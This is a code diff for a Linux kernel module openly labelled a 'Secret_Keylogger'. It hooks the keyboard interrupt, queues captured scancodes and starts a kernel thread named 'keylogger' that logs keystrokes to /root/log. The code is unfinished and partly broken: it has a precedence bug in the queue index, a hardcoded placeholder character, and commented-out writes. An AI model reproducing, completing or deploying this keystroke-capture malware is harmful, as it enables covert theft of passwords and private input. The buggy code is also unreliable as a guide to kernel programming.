@@ -15,13 +15,64 @@
 
 #include <linux/kthread.h>
 #include <linux/sched.h>
+#include <linux/delay.h>
 
 #define KB_IRQ 1
 
-const char* NAME = "---Secret_Keylogger---";
+const char *NAME = "---Secret_Keylogger---";
+const char *LOG_FILE = "/root/log";
 struct file* log_fp;
+loff_t log_offset;
 unsigned char g;
 struct task_struct *logger;
+
+#define CQUEUE_MAX 128
+struct cqueue_t{
+	unsigned char buffer[CQUEUE_MAX];
+	int f, r;
+	int size;
+};
+
+void cqueue_init(struct cqueue_t *cqueue)
+{
+	cqueue->f = 0;
+	cqueue->r = CQUEUE_MAX - 1;
+	cqueue->size = 0;
+}
+
+int cqueue_empty(struct cqueue_t *cqueue)
+{
+	return (cqueue->size == 0);
+}
+
+int cqueue_full(struct cqueue_t *cqueue)
+{
+	return (cqueue->size == CQUEUE_MAX - 1);
+}
+
+int cqueue_insert(struct cqueue_t *cqueue, char c)
+{
+	if(cqueue_full(cqueue)){
+		printk("QUEUE FULL!\n");
+		return 0;
+	}
+
+	cqueue->r = cqueue->r + 1 % CQUEUE_MAX;
+	cqueue->buffer[cqueue->r] = c;
+	++cqueue->size;
+	return 1;
+}
+
+char cqueue_remove(struct cqueue_t *cqueue)
+{
+	char c = cqueue->buffer[cqueue->f];
+
+	cqueue->f = cqueue->f + 1 % CQUEUE_MAX;
+	--cqueue->size;
+	return c;	
+}
+
+struct cqueue_t keystroke_queue;
 
 /* =================================================================== */
 
@@ -50,7 +101,7 @@ void log_close(struct file *fp)
 	filp_close(fp, NULL);
 }
 
-int log_write(struct file *fp, unsigned long long offset, unsigned char *data,
+int log_write(struct file *fp, unsigned char *data,
 		unsigned int size)
 {
 	mm_segment_t old_fs;
@@ -59,7 +110,8 @@ int log_write(struct file *fp, unsigned long long offset, unsigned char *data,
 	old_fs = get_fs();
 	set_fs(get_ds());
 
-	ret = vfs_write(fp, data, size, &offset);
+	ret = vfs_write(fp, data, size, &log_offset);
+	log_offset += size;
 
 	set_fs(old_fs);
 	return ret;
@@ -69,24 +121,20 @@ int log_write(struct file *fp, unsigned long long offset, unsigned char *data,
 
 int kthread_log_keystrokes(void *data)
 {
-	char c = 0x00;
-	{
-		char buf[16];
-		memset(buf, 0, sizeof(buf));
-		strcpy(buf, "Test!\n");
-		log_write(log_fp, 0, buf, sizeof(buf));
-	}
-
 	while(!kthread_should_stop()){
 		schedule();
-		if(c != g){
+		if(!cqueue_empty(&keystroke_queue)){
 			char buf[16];
 			memset(buf, 0, sizeof(buf));
-			sprintf(buf, "[%d]", c);
-			log_write(log_fp, 0, buf, sizeof(buf));
+			char c = 'a'; /*cqueue_remove(&keystroke_queue);*/
+			sprintf(buf, "%d\n", c);
+			printk(buf);
+			/*sprintf(buf, "[%d]", cqueue_remove(&keystroke_queue));
+			log_write(log_fp, buf, sizeof(buf));*/
 		}
-		c = g;
 	}
+
+	return 0;
 }
 
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
@@ -100,7 +148,7 @@ irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 		printk("You pressed ESC!\n");
 	}
 	else{
-		g = scancode;
+		cqueue_insert(&keystroke_queue, scancode);
 	}
 	/* TODO:
 	 * Writing to a file during an ISR crashes the system, so
@@ -121,7 +169,7 @@ static int __init kb_init(void)
 	 * Note this file may be different for each distro
 	 */
 
-	log_fp = log_open("/root/test.txt", O_WRONLY | O_CREAT, 0644);
+	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
 	if(IS_ERR(log_fp)){
 		printk("FAILED to open log file.\n");
 		return 1;
@@ -131,10 +179,12 @@ static int __init kb_init(void)
 		unsigned char buf[32];
 		memset(buf, 0, sizeof(buf));
 		strcpy(buf, "[a][a]\n[b][b]\n");
-		log_write(log_fp, 0, buf, sizeof(buf));
-		logger = kthread_run(&kthread_log_keystrokes, NULL, "pradeep");
+		log_write(log_fp, buf, sizeof(buf));
+		logger = kthread_run(&kthread_log_keystrokes, NULL, "keylogger");
 		printk("KERNEL THREAD: %s\n", logger->comm);		
 	}
+
+	cqueue_init(&keystroke_queue);
 
 	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
 			NAME, (void*)(kb_irq_handler));
